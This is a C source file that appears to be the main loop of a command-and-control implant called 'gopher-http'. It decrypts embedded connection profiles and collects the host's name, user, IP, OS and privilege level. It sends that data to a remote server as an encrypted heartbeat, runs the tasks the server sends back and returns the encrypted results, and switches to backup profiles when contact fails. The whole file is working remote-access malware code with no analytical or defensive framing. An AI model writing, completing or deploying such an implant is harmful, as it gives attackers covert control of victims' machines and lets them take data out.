//
// Created by seba on 10/17/26.
//

#include "common.h"
#include "config.h"
#include "profile.h"
#include "crypt.h"
#include "pack.h"
#include "net_http.h"
#include "os_info.h"
#include "tasks.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

static int      ACTIVE = 1;
static Profile *profiles     = NULL;
static uint8_t **enc_keys    = NULL;
static size_t   profile_count = 0;
static size_t   profile_index = 0;

static int decode_profiles(void) {
    for (size_t i = 0; i < enc_profiles_count; i++) {
        const uint8_t *blob = enc_profiles[i];
        size_t blob_len = sizeof(enc_profiles[i]);

        if (blob_len < 16) continue;

        uint8_t *key = malloc(16);
        if (!key) continue;
        memcpy(key, blob, 16);

        uint8_t *dec = NULL;
        size_t dec_len = 0;
        if (crypt_decrypt(blob + 16, blob_len - 16, key, 16, &dec, &dec_len) < 0) {
            free(key);
            continue;
        }

        Profile p = {0};
        if (pack_decode_profile(dec, dec_len, &p) < 0) {
            free(key);
            free(dec);
            continue;
        }
        free(dec);

        profiles = realloc(profiles, (profile_count + 1) * sizeof(Profile));
        enc_keys = realloc(enc_keys, (profile_count + 1) * sizeof(uint8_t *));
        profiles[profile_count] = p;
        enc_keys[profile_count] = key;
        profile_count++;
    }

    DBG("decoded %zu profile(s)\n", profile_count);
    return (profile_count > 0) ? 0 : -1;
}

static uint8_t *build_heartbeat(uint32_t agent_id, const Profile *prof, const SessionInfo *info, const uint8_t *enc_key, size_t *out_len) {
    uint8_t *si_data = NULL;
    size_t   si_len = 0;
    if (pack_encode_session_info(info, &si_data, &si_len) < 0) return NULL;

    size_t raw_len = 4 + 4 + si_len;
    uint8_t *raw = malloc(raw_len);
    uint32_t type_be = prof->type;
    raw[0] = (uint8_t)(type_be >> 24); raw[1] = (uint8_t)(type_be >> 16);
    raw[2] = (uint8_t)(type_be >> 8);  raw[3] = (uint8_t)(type_be);
    raw[4] = (uint8_t)(agent_id >> 24); raw[5] = (uint8_t)(agent_id >> 16);
    raw[6] = (uint8_t)(agent_id >> 8);  raw[7] = (uint8_t)(agent_id);
    memcpy(raw + 8, si_data, si_len);
    free(si_data);

    uint8_t *encrypted = NULL;
    size_t enc_len = 0;
    if (crypt_encrypt(raw, raw_len, enc_key, 16, &encrypted, &enc_len) < 0) {
        free(raw);
        return NULL;
    }
    free(raw);

    *out_len = enc_len;
    return encrypted;
}

static void process_tasks(const uint8_t *resp_data, size_t resp_len, const uint8_t *session_key, uint8_t **result_out, size_t *result_len) {
    *result_out = NULL;
    *result_len = 0;

    uint8_t *plain = NULL;
    size_t  plain_len = 0;
    if (crypt_decrypt(resp_data, resp_len, session_key, 16, &plain, &plain_len) < 0) return;

    Message in_msg = {0};
    if (pack_decode_message(plain, plain_len, &in_msg) < 0) { free(plain); return; }
    free(plain);

    if (in_msg.type != 1 || in_msg.object_count == 0) {
        message_free(&in_msg);
        return;
    }

    uint8_t **results = NULL;
    size_t *result_sizes = NULL;
    size_t result_count = 0;

    for (size_t ci = 0; ci < in_msg.object_count; ci++) {
        Command cmd = {0};
        if (pack_decode_command(in_msg.objects[ci], in_msg.object_lens[ci], &cmd) < 0) continue;

        DBG("command code=%u id=%u\n", cmd.code, cmd.id);

        if (task_process(&cmd, &ACTIVE) < 0) { free(cmd.data); continue; }

        uint8_t *resp = NULL;
        size_t resp_sz = 0;
        if (pack_encode_command(&cmd, &resp, &resp_sz) == 0) {
            results      = realloc(results, (result_count + 1) * sizeof(uint8_t *));
            result_sizes = realloc(result_sizes, (result_count + 1) * sizeof(size_t));
            results[result_count]      = resp;
            result_sizes[result_count] = resp_sz;
            result_count++;
        }
        free(cmd.data);
    }

    message_free(&in_msg);

    if (result_count == 0) return;

    Message out_msg = { .type = 1, .objects = results, .object_lens = result_sizes, .object_count = result_count };
    uint8_t *msg_data = NULL;
    size_t msg_len = 0;
    pack_encode_message(&out_msg, &msg_data, &msg_len);

    for (size_t ci = 0; ci < result_count; ci++) free(results[ci]);
    free(results);
    free(result_sizes);

    if (!msg_data) return;

    uint8_t *enc = NULL;
    size_t enc_len = 0;
    if (crypt_encrypt(msg_data, msg_len, session_key, 16, &enc, &enc_len) < 0) {
        free(msg_data);
        return;
    }
    free(msg_data);

    *result_out = enc;
    *result_len = enc_len;
}

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    DBG("gopher-http starting\n");

    if (decode_profiles() < 0) {
        DBG("no valid profiles, exiting\n");
        return 1;
    }

    SessionInfo info;
    os_collect_info(&info);
    uint8_t session_key[16];
    memcpy(session_key, info.encrypt_key, 16);

    DBG("host=%s user=%s ip=%s os=%s pid=%d elevated=%d\n", info.host, info.user, info.ipaddr, info.os_version, info.pid, info.elevated);

    uint8_t id_bytes[4];
    crypt_random(id_bytes, 4);
    uint32_t agent_id = ((uint32_t)id_bytes[0] << 24) | ((uint32_t)id_bytes[1] << 16) | ((uint32_t)id_bytes[2] << 8)  | ((uint32_t)id_bytes[3]);
    DBG("agent_id=0x%08X\n", agent_id);

    Profile *prof = &profiles[profile_index];
    uint8_t *enc_key = enc_keys[profile_index];

    size_t beat_len = 0;
    uint8_t *beat_val = build_heartbeat(agent_id, prof, &info, enc_key, &beat_len);
    if (!beat_val) {
        DBG("failed to build heartbeat\n");
        session_info_free(&info);
        return 1;
    }
    DBG("heartbeat built (%zu bytes)\n", beat_len);

    tasks_init(prof, enc_key, session_key, agent_id);

    HttpCtx *http = http_init();
    http_set_profile(http, prof, beat_val, beat_len);

    uint8_t *pending_body = NULL;
    size_t pending_len = 0;
    int failures = 0;

    while (ACTIVE) {
        uint8_t *resp = NULL;
        size_t resp_len = 0;

        DBG("poll (body=%zu bytes)\n", pending_len);

        int rc = http_exchange(http, pending_body, pending_len, &resp, &resp_len);
        free(pending_body);
        pending_body = NULL;
        pending_len = 0;

        if (rc < 0) {
            failures++;
            DBG("exchange failed (%d/%d)\n", failures, prof->conn_count);
            if (failures >= prof->conn_count) {
                if (profile_count > 1) {
                    profile_index = (profile_index + 1) % profile_count;
                    prof = &profiles[profile_index];
                    enc_key = enc_keys[profile_index];

                    free(beat_val);
                    beat_val = build_heartbeat(agent_id, prof, &info, enc_key, &beat_len);
                    tasks_init(prof, enc_key, session_key, agent_id);
                    http_set_profile(http, prof, beat_val, beat_len);
                    failures = 0;
                    DBG("rotated to profile %zu\n", profile_index);
                } else {
                    break;
                }
            }
            sleep((unsigned)prof->conn_timeout);
            continue;
        }

        failures = 0;

        if (resp && resp_len > 0) {
            process_tasks(resp, resp_len, session_key, &pending_body, &pending_len);
            free(resp);
        }

        if (ACTIVE) sleep((unsigned)prof->sleep_interval);
    }

    free(pending_body);
    free(beat_val);
    http_free(http);
    session_info_free(&info);
    for (size_t i = 0; i < profile_count; i++) {
        profile_free(&profiles[i]);
        free(enc_keys[i]);
    }
    free(profiles);
    free(enc_keys);

    DBG("gopher-http exiting\n");
    return 0;
}
